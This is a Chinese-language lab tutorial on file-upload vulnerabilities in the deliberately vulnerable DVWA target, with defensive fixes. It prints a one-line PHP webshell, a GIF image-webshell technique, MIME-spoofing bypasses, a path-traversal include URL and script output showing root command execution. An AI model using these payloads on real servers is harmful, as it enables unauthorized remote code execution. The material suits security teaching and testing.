# 16 · 文件上传与 Webshell：三类校验、三套绕过与一句话木马

> 文件上传漏洞 = 把「攻击者的代码」送进「服务器的地盘」：写得进、放得对、
> 被当代码跑，就得到一个 webshell（网页后门：发一条请求执行一条命令）。
> 本实验在 DVWA（故意布满漏洞的本地靶站）上传点的三档校验下各打一次：
> low 一句话木马（只含一行代码的极简 webshell）直接落地执行；
> medium 伪造声明类型；high 用「真图 + php 尾巴」的图片马骗过内容校验、
> 再用文件包含（服务端把另一个文件当代码引入执行的功能）当引信点火。
> 所有操作只打本地靶场，收尾会移除木马。

## Background

上传功能本身是正常需求（头像、附件、导入）。危险来自两个「落地」问题：
落在哪里——Web 目录（能通过 URL 访问）；落下什么——文件名与内容用户可控。
更隐蔽的是：服务器怎么判断「这是个安全文件」？

三种常见的判断方式，可靠性差了一个量级：不查（文件进了就能被访问）、
信客户端自报的类型（MIME 类型：请求里声明文件类型的标签）、真去解析
文件内容（图必须是真图）。本实验的三档靶点正好对应这三层。

为什么高危：上传变成 webshell 后，漏洞危害从「一个请求」升级成
「一台机器」——之后的提权（把权限提到系统最高）、横移（从这台机器跨到内网
其他机器）都以它为跳板。

## What

一句话定义：文件上传漏洞是**服务器接受并落地了可执行内容，且落地位置能被
解析执行**。前面半句在「传」，后面半句在「跑」——两者缺一，拿不到 shell。

心智模型：往公司信箱塞包裹——前台只看你贴的「易碎品」标签（客户端自报
的类型），包裹却径直进了档案室（Web 目录）。失效边界：进了档案室 ≠ 你能
远程指挥它——还要它「能被点火」（扩展名被当 PHP 解析，或另找引信）。

| 校验档位 | 信什么 | 绕过 |
|:---|:---|:---|
| low：不查 | 谁都能进 | 直接传 shell.php |
| medium：查 MIME | 客户端自报的 Content-Type | 伪造 image/jpeg |
| high：查内容 | 真图 + 白名单扩展名 | 图片马 + 文件包含点火 |

## When to Use

典型场景：授权渗透里找上传点（头像、导入、附件），验证「传上去的东西
是否可执行」；代码审计时看上传后的落地路径、命名与解析配置；给实验 19
的日志检测造 webshell 样本流量。

何时不用：未授权目标不碰；真实站上别留 webshell——本实验的收尾步骤会
移除上传的木马，这个卫生习惯是渗透伦理的一部分。另外，「图片马没被
执行」不等于安全——可能只是引信还没找到。

| 做法 | 机制 | 什么时候选它 |
|:---|:---|:---|
| 手工三件套（本实验） | 三种 payload（攻击载荷：这里就是三个木马文件）逐档验证 | 看清每层校验信的是什么 |
| webshell 管理工具 | 可视化操作已上传的壳 | 已确认可执行后的批量操作 |
| 代码审计 | 读上传处理与服务器配置 | 根治问题、覆盖全部上传点 |

## Quick Start

前置：实验 12 搭好的 DVWA 靶站（本脚本自动拉起）；Python 的 `requests`（发
multipart 请求用）。不需要其他依赖。

```bash
cd network/16_upload_webshell
./upload_lab.sh            # 起靶场 → 三条绕过链 → 清理（约 30 秒）
./upload_lab.sh apply      # 只拉起靶场、生成 payload、登录取会话
./upload_lab.sh observe    # 只跑三条绕过链
./upload_lab.sh clean      # 移除上传的木马并清 artifacts（靶场留给后续实验）
```

默认运行的真实输出（节选）：

```text
... # 输出首行空行省略
=====> [apply] 拉起 DVWA + 生成三种 payload + 登录取会话
... # dvwa.sh 两行（「初始化数据库」段头与其下 ✅ 行）省略（段内空行从略，下同）
[gen] 三种 payload 已生成到 artifacts/：
[gen]   shell.php      一句话木马（31 字节）
[gen]   shell.php.jpg  双扩展名（内容同一句话）
[gen]   shell.jpg      GIF 图片马（真图 + php 尾巴，75 字节）
  ✅ 上传点就绪：http://127.0.0.1:8612/vulnerabilities/upload/（low 会话已备给文件包含用）

=====> [observe] ① low：无任何校验——一句话木马直接落地并执行
[upload] 文件名=shell.php 声明类型=application/octet-stream（low 档）→ 上传成功
[curl] shell.php?cmd=whoami → root
  ✅ low：上传即执行——curl 直接拿到执行用户 root（无需任何凭据）

=====> [observe] ② medium：只查客户端自报的 MIME——伪造 Content-Type 即过
[upload] 文件名=shell.php 声明类型=image/jpeg（medium 档）→ 上传成功
[shell] cmd=id → uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[upload] 文件名=shell.php.jpg 声明类型=image/jpeg（medium 档）→ 上传成功
  ✅ medium：改声明类型就过（查的是「你自称什么」）；双扩展名同样被接受——它不看扩展名

=====> [observe] ③ high：扩展名白名单 + 真图内容——图片马过检，文件包含执行
[upload] 文件名=shell.php 声明类型=application/octet-stream（high 档）→ 被拒绝
[upload] 靶场回应：Your image was not uploaded. We can only accept JPEG or PNG images.
  ↳ 负对照：纯 php 被拒——白名单扩展名 + getimagesize 双重校验确实在拦
[upload] 文件名=shell.jpg 声明类型=application/octet-stream（high 档）→ 上传成功
[shell] cmd=whoami → root
  ✅ high：GIF 图片马以 jpg 扩展名过检；文件包含把它当 PHP 执行——组合拳成立
... # clean 段省略
```

诚实预期（新手第一个失败点）：① 「上传成功」不等于「执行成功」——能不能
跑取决于服务器解析规则（本栈 .jpg 只被静态送出）或有没有引信；② 图片马
需要文件包含配合点火，而包含点常要求登录（本靶场如此）；③ webshell 的
权限 = Web 进程权限（本容器里是 root，真实环境里通常更受限）。

## How It Works

![三类校验、三套绕过](images/upload_webshell.svg)

> 怎么看：从左到右是三关逐级变严的校验（low 无校验 → medium 查自称类型
> → high 验真图），每关节点里写着它的检查与破绽；最右是「图片马 + 文件
> 包含」的组合拳与修复列。

> 🌐 **交互版**：本地打开 [`images/upload_webshell.html`](images/upload_webshell.html)。

**三类校验各信什么**：low 什么都不查——文件名原样落地；medium 查
`$_FILES['type']`——multipart（浏览器上传文件用的请求格式）里由客户端
声明的那一行，一行就能改；high 才动真格：`getimagesize`（真解析文件头
的 PHP 函数）+ 扩展名白名单。

**图片马为什么能过、又为什么要引信**：在合法 GIF 的 43 字节后追加
`<?php ... ?>`——图是真的（过 getimagesize），php 也真在里面。但请求
shell.jpg 只会被静态送出、不执行；把「点火」交给文件包含——GIF 字节被
原样输出、php 段执行（包含 URL 见踩坑清单）。

**webshell 客户端**：一句话木马是 `<?php system($_GET['cmd']); ?>`——
每个请求携带一个命令、回显即输出。客户端把响应里的命令输出抠出来打印，
所以它能同时服务「直连 shell.php」和「经包含点」两种通道。

**修复四件套**：扩展名白名单 + 服务端重编码图片（把埋在文件里的尾巴剥
掉）；落地文件名随机化；上传目录禁止脚本解析；多重校验并行。图像场景
「重编码」最彻底——文件经过编码器重写，任何夹带都会消失。

## Pitfalls & Q&A

踩坑清单（现象 → 原因 → 解法）：

- **上传成功但访问到的是源码/404**：解析规则没跟上——php 内置服务器按
  扩展名决定是否执行，`.jpg`、`.php.jpg` 只会被静态送出。
- **include 没执行、响应是个登录页**：包含点要求登录——带上会话 cookie
  （302 跳转到 login.php 就是征兆）。
- **包含路径失败**：裸相对路径相对的不是网站根目录——用相对包含脚本的
  `../../` 形式或绝对路径：`?page=../../hackable/uploads/shell.jpg`。
- **图片马被 getimagesize 拒**：GIF 头要写完整（含宽高字段的 10 字节），
  只贴「GIF89a」六个字符不够。

深入问答：

- **Q: 为什么防御不能靠扩展名黑名单？** A: 黑名单是开放集（php3、phtml、
  大小写、多后缀、服务器配置差异……永远漏）；白名单 + 重编码才是闭集
  思路。
- **Q: webshell 为什么难检测？** A: 一句话木马的请求和普通 GET 没有外形
  差异，要靠「上传后短时间被访问 + 参数像命令 + 回显特征」的组合信号——
  实验 19 的日志检测会回来讲这一课。
- **Q: 为什么本实验的 shell 是 root？** A: 这是靶场容器把 Web 进程跑成
  root 的结果——真实环境里 webshell 权限通常受限，但「受约束的远程执行」
  依然足以致命。
